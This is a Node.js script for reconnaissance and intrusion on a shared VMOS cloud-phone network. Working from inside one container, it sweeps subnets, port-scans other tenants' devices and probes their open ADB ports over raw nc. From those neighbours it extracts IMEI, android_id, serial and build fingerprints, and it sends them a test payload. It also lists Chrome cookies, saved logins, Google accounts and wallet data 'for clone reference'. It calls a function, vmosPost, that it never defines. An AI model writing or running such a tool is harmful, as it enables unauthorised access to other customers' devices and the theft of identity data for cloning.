#!/usr/bin/env node
/**
 * VMOS Titan — Neighbor Device Scanner
 * 
 * Scans from inside our container to find OTHER devices on the VMOS cloud
 * network. Excludes our own devices: ACP250923JS861KJ & ACP251008GUOEEHB.
 * 
 * Phases:
 *  1. Get our IPs so we can exclude them
 *  2. Aggressive /16 subnet sweep to find neighbor containers
 *  3. Port scan neighbors (ADB 5555, SSH, HTTP)
 *  4. Probe accessible neighbors — extract identity, app data, cookies, proxy
 *  5. Test binary send via nc to reachable neighbors
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api, sh } = require('../shared/vmos_api');
const SCAN_FROM = 'ACP250923JS861KJ';
const OUR_DEVICES = new Set(['ACP250923JS861KJ', 'ACP251008GUOEEHB']);

const REPORT = { timestamp: new Date().toISOString(), scan_from: SCAN_FROM, excluded: [...OUR_DEVICES], neighbors: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('\n' + '═'.repeat(70));
  console.log('  NEIGHBOR DEVICE SCANNER (excluding our devices)');
  console.log('  Scanning from: ' + SCAN_FROM);
  console.log('  Excluding: ' + [...OUR_DEVICES].join(', '));
  console.log('═'.repeat(70));

  // ── Step 1: Get our own IPs to exclude ─────────────────────────
  log('STEP 1: Identify our own IPs to exclude');
  const ourIpRaw = await sh("ip addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", 10);
  const ourIp = ourIpRaw.trim();
  // PAD2 IP from API
  const rInfos = await vmosPost('/vcpcloud/api/padApi/infos', { page: 1, rows: 100 });
  const devList = rInfos.data?.pageData || [];
  const ourIps = new Set();
  for (const d of devList) {
    if (OUR_DEVICES.has(d.padCode)) {
      ourIps.add(d.deviceIp);
    }
  }
  ourIps.add(ourIp);
  // Also add our eth0 IP
  REPORT.our_ips = [...ourIps];
  log(`  Our IPs to exclude: ${[...ourIps].join(', ')}`);

  // ── Step 2: Aggressive subnet sweep ────────────────────────────
  log('');
  log('STEP 2: AGGRESSIVE SUBNET SWEEP');
  
  // Our IP is 10.0.96.174/16 — scan many /24s within 10.0.0.0/16
  const base = ourIp.match(/^(\d+\.\d+)\./) ? ourIp.match(/^(\d+\.\d+)\./)[1] : '10.0';
  const ourThird = parseInt(ourIp.split('.')[2]) || 96;
  
  const allDiscovered = new Set();
  
  // 2a: Full sweep of our /24
  log(`  2a: Full sweep ${base}.${ourThird}.0/24...`);
  const sweep1 = await sh([
    `for i in $(seq 1 254); do`,
    `  (ping -c1 -W1 ${base}.${ourThird}.$i >/dev/null 2>&1 && echo "H:${base}.${ourThird}.$i") &`,
    `done; wait`,
    `echo SWEEP1_DONE`,
  ].join('\n'), 60);
  (sweep1.match(/H:[\d.]+/g) || []).forEach(h => allDiscovered.add(h.slice(2)));
  log(`    Found: ${(sweep1.match(/H:[\d.]+/g) || []).length} hosts`);

  // 2b: Sweep adjacent /24 subnets (±10 of our third octet)
  log(`  2b: Adjacent /24 subnets...`);
  for (let off = -10; off <= 10; off++) {
    const third = ourThird + off;
    if (third < 0 || third > 255 || third === ourThird) continue;
    const scanR = await sh([
      `for i in 1 2 3 5 10 20 30 50 100 128 150 200 250 254; do`,
      `  (ping -c1 -W1 ${base}.${third}.$i >/dev/null 2>&1 && echo "H:${base}.${third}.$i") &`,
      `done; wait`,
    ].join('\n'), 15);
    const found = (scanR.match(/H:[\d.]+/g) || []).map(h => h.slice(2));
    found.forEach(h => allDiscovered.add(h));
    if (found.length > 0) log(`    ${base}.${third}.x: ${found.join(', ')}`);
    await sleep(100);
  }

  // 2c: Wide scan — every 16th subnet across /16
  log(`  2c: Wide /16 sweep (every 16th subnet)...`);
  for (let third = 0; third <= 255; third += 16) {
    if (Math.abs(third - ourThird) <= 10) continue; // already scanned
    const scanR = await sh([
      `for i in 1 2 5 10 50 100 200 254; do`,
      `  (ping -c1 -W1 ${base}.${third}.$i >/dev/null 2>&1 && echo "H:${base}.${third}.$i") &`,
      `done; wait`,
    ].join('\n'), 12);
    const found = (scanR.match(/H:[\d.]+/g) || []).map(h => h.slice(2));
    found.forEach(h => allDiscovered.add(h));
    if (found.length > 0) log(`    ${base}.${third}.x: ${found.join(', ')}`);
    await sleep(100);
  }

  // 2d: Check ARP table for any more
  log(`  2d: ARP table harvest...`);
  const arpDump = await sh('cat /proc/net/arp 2>/dev/null', 10);
  const arpIps = (arpDump.match(/(\d+\.\d+\.\d+\.\d+)/g) || []);
  arpIps.forEach(h => allDiscovered.add(h));
  if (arpIps.length > 0) log(`    ARP: ${arpIps.join(', ')}`);

  // 2e: Route table for gateway
  const routeDump = await sh('ip route show 2>/dev/null', 10);
  log(`  Routes: ${routeDump.split('\n')[0]}`);
  const gwMatch = routeDump.match(/default via (\d+\.\d+\.\d+\.\d+)/);
  const gateway = gwMatch ? gwMatch[1] : null;
  if (gateway) { allDiscovered.add(gateway); log(`  Gateway: ${gateway}`); }

  // Remove our own IPs
  for (const ip of ourIps) allDiscovered.delete(ip);
  allDiscovered.delete('0.0.0.0');
  
  const neighbors = [...allDiscovered].sort((a, b) => {
    const pa = a.split('.').map(Number), pb = b.split('.').map(Number);
    for (let i = 0; i < 4; i++) { if (pa[i] !== pb[i]) return pa[i] - pb[i]; }
    return 0;
  });
  
  log(`\n  ✓ TOTAL NEIGHBOR HOSTS DISCOVERED: ${neighbors.length} (excluding our ${ourIps.size} IPs)`);
  for (const h of neighbors) log(`    ${h}`);
  REPORT.neighbors.discovered = neighbors;

  // ── Step 3: Port scan all neighbors ────────────────────────────
  log('');
  log('STEP 3: PORT SCAN NEIGHBORS');
  
  REPORT.neighbors.port_scan = {};
  const targets = neighbors.slice(0, 50); // cap at 50
  
  for (const host of targets) {
    const portR = await sh([
      `for p in 22 53 80 443 2375 5037 5555 8080 8443 9090 15555; do`,
      `  (echo >/dev/tcp/${host}/$p 2>/dev/null && echo "O:$p") &`,
      `done; wait`,
    ].join('\n'), 12);
    
    const open = (portR.match(/O:\d+/g) || []).map(p => p.slice(2));
    REPORT.neighbors.port_scan[host] = open;
    if (open.length > 0) log(`  ${host}: OPEN → ${open.join(', ')}`);
    await sleep(100);
  }
  
  // Identify ADB-enabled neighbors
  const adbNeighbors = Object.entries(REPORT.neighbors.port_scan)
    .filter(([_, ports]) => ports.includes('5555'))
    .map(([host]) => host);
  log(`\n  ✓ NEIGHBORS WITH ADB (5555): ${adbNeighbors.length}`);
  for (const h of adbNeighbors) log(`    ${h}`);
  REPORT.neighbors.adb_hosts = adbNeighbors;

  // ── Step 4: Probe ADB neighbors — identity + data extraction ───
  log('');
  log('STEP 4: PROBE ADB NEIGHBORS (identity + data)');
  
  REPORT.neighbors.probed = {};
  
  for (const host of adbNeighbors.slice(0, 10)) {
    log(`\n  ─── Probing ${host} ───`);
    REPORT.neighbors.probed[host] = {};
    
    // 4a: ADB connect attempt
    log(`    4a: ADB handshake...`);
    const adbHello = await sh(`echo "host:version" | nc -w3 ${host} 5555 2>/dev/null | head -3; echo ADB_PROBE_DONE`, 10);
    REPORT.neighbors.probed[host].adb_hello = adbHello;
    log(`      ${adbHello.split('\n')[0]}`);
    
    // 4b: Try to get device identity via nc raw shell
    log(`    4b: Shell probe via nc...`);
    const shellProbe = await sh([
      `(echo "shell:getprop ro.product.brand; getprop ro.product.model; getprop ro.build.fingerprint; getprop persist.sys.cloud.imeinum; getprop ro.boot.pad_code; getprop ro.serialno; settings get secure android_id 2>/dev/null; getprop persist.sys.cloud.wifi.mac; getprop gsm.operator.alpha; getprop persist.sys.timezone; echo PROBE_END" | nc -w5 ${host} 5555 2>/dev/null) | head -20`,
    ].join(''), 15);
    REPORT.neighbors.probed[host].shell_probe = shellProbe;
    for (const line of shellProbe.split('\n').slice(0, 10)) {
      if (line.trim()) log(`      ${line.trim()}`);
    }
    
    // 4c: HTTP probe if port 80/8080 open
    const hostPorts = REPORT.neighbors.port_scan[host] || [];
    if (hostPorts.includes('80') || hostPorts.includes('8080')) {
      const httpPort = hostPorts.includes('80') ? 80 : 8080;
      log(`    4c: HTTP banner (port ${httpPort})...`);
      const httpR = await sh(`curl -s -m5 http://${host}:${httpPort}/ 2>/dev/null | head -20`, 10);
      REPORT.neighbors.probed[host].http = httpR;
      log(`      ${httpR.split('\n')[0].slice(0, 80)}`);
    }

    await sleep(200);
  }

  // ── Step 5: Test binary send to ADB neighbors ──────────────────
  if (adbNeighbors.length > 0) {
    log('');
    log('STEP 5: BINARY SEND TEST TO NEIGHBORS');
    
    const testTarget = adbNeighbors[0];
    log(`  Target: ${testTarget}`);
    
    // Create test payload
    log(`  Creating test payload...`);
    await sh(`echo "TITAN_SCAN_PROBE_$(date +%s)_FROM_${SCAN_FROM}" > /data/local/tmp/probe_payload.txt`, 10);
    
    // Try nc send
    log(`  Sending via nc...`);
    const sendR = await sh([
      `cat /data/local/tmp/probe_payload.txt | nc -w5 ${testTarget} 5555 2>&1`,
      `echo "NC_SEND_EXIT=$?"`,
    ].join('; '), 15);
    REPORT.neighbors.binary_send = { target: testTarget, result: sendR };
    log(`  Result: ${sendR.split('\n')[0]}`);
  }

  // ── Step 6: Extract data from OUR device for clone reference ───
  log('');
  log('STEP 6: EXTRACT OUR DEVICE DATA (clone reference)');
  
  // Chrome cookies
  log('  6a: Chrome cookies...');
  const chromeCookies = await sh([
    'ls -la /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null',
    'sqlite3 /data/data/com.android.chrome/app_chrome/Default/Cookies "SELECT host_key,name,path,expires_utc FROM cookies LIMIT 20;" 2>/dev/null || echo NO_SQLITE3',
    // Fallback: base64 dump the cookie DB
    'wc -c /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null',
  ].join('; '), 15);
  REPORT.neighbors.our_data = { chrome_cookies: chromeCookies };
  log(`    ${chromeCookies.split('\n')[0]}`);
  
  // Chrome login data
  log('  6b: Chrome Login Data...');
  const chromeLogin = await sh([
    'ls -la /data/data/com.android.chrome/app_chrome/Default/Login\\ Data 2>/dev/null',
    'ls -la "/data/data/com.android.chrome/app_chrome/Default/Login Data" 2>/dev/null',
  ].join('; '), 10);
  REPORT.neighbors.our_data.chrome_login = chromeLogin;
  log(`    ${chromeLogin.split('\n')[0]}`);

  // Chrome Web Data (autofill)
  log('  6c: Chrome Web Data (autofill)...');
  const chromeWeb = await sh('ls -la "/data/data/com.android.chrome/app_chrome/Default/Web Data" 2>/dev/null', 10);
  REPORT.neighbors.our_data.chrome_webdata = chromeWeb;
  log(`    ${chromeWeb.split('\n')[0]}`);
  
  // Google accounts
  log('  6d: Google accounts...');
  const gAccounts = await sh('dumpsys account 2>/dev/null | grep -E "Account \\{" | head -10', 15);
  REPORT.neighbors.our_data.google_accounts = gAccounts;
  log(`    ${gAccounts.split('\n')[0]}`);
  
  // Proxy config
  log('  6e: Proxy configuration...');
  const proxyData = await sh([
    'getprop ro.sys.cloud.proxy.type',
    'getprop ro.sys.cloud.proxy.mode',
    'getprop ro.sys.cloud.proxy.data',
    'settings get global http_proxy 2>/dev/null',
    'settings get global global_http_proxy_host 2>/dev/null',
    'settings get global global_http_proxy_port 2>/dev/null',
    'cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -i proxy | head -5',
    'iptables -t nat -L -n 2>/dev/null | grep -i REDIRECT | head -5',
  ].join('; '), 15);
  REPORT.neighbors.our_data.proxy = proxyData;
  for (const line of proxyData.split('\n').slice(0, 5)) {
    if (line.trim()) log(`    ${line.trim()}`);
  }
  
  // WiFi saved networks
  log('  6f: WiFi configs...');
  const wifiData = await sh('cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -30', 10);
  REPORT.neighbors.our_data.wifi = wifiData;
  
  // Full app list with data sizes
  log('  6g: App data sizes (top 20)...');
  const appSizes = await sh('du -sk /data/data/* 2>/dev/null | sort -rn | head -20', 15);
  REPORT.neighbors.our_data.app_sizes = appSizes;
  for (const line of appSizes.split('\n').slice(0, 10)) {
    if (line.trim()) log(`    ${line.trim()}`);
  }
  
  // GMS databases
  log('  6h: GMS databases...');
  const gmsDb = await sh('ls -la /data/data/com.google.android.gms/databases/ 2>/dev/null | head -20', 10);
  REPORT.neighbors.our_data.gms_dbs = gmsDb;
  
  // Wallet data
  log('  6i: Wallet/Pay data...');
  const walletData = await sh([
    'ls -laR /data/data/com.google.android.apps.walletnfcrel/ 2>/dev/null | head -30',
    'echo "---"',
    'ls -la /data/data/com.google.android.gms/databases/tapandpay* 2>/dev/null',
  ].join('; '), 15);
  REPORT.neighbors.our_data.wallet = walletData;
  for (const line of walletData.split('\n').slice(0, 5)) {
    if (line.trim()) log(`    ${line.trim()}`);
  }

  // ── Save Report ────────────────────────────────────────────────
  log('');
  const reportFile = `${path.join(__dirname, '..', 'reports')}/NEIGHBOR_SCAN_${Date.now()}.json`;
  fs.writeFileSync(reportFile, JSON.stringify(REPORT, null, 2));
  log(`Report saved: ${reportFile}`);

  // ── Summary ────────────────────────────────────────────────────
  console.log('\n' + '═'.repeat(70));
  console.log('  SCAN SUMMARY');
  console.log('═'.repeat(70));
  console.log(`  Our IPs (excluded):    ${[...ourIps].join(', ')}`);
  console.log(`  Neighbor hosts found:  ${neighbors.length}`);
  console.log(`  Hosts with ADB open:   ${adbNeighbors.length}`);
  console.log(`  Hosts port-scanned:    ${targets.length}`);
  console.log(`  Hosts probed:          ${Object.keys(REPORT.neighbors.probed || {}).length}`);
  console.log('');
  if (neighbors.length > 0) {
    console.log('  Discovered Neighbors:');
    for (const h of neighbors) {
      const ports = REPORT.neighbors.port_scan[h] || [];
      console.log(`    ${h}${ports.length ? ' → ports: ' + ports.join(',') : ''}`);
    }
  }
  console.log('');
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
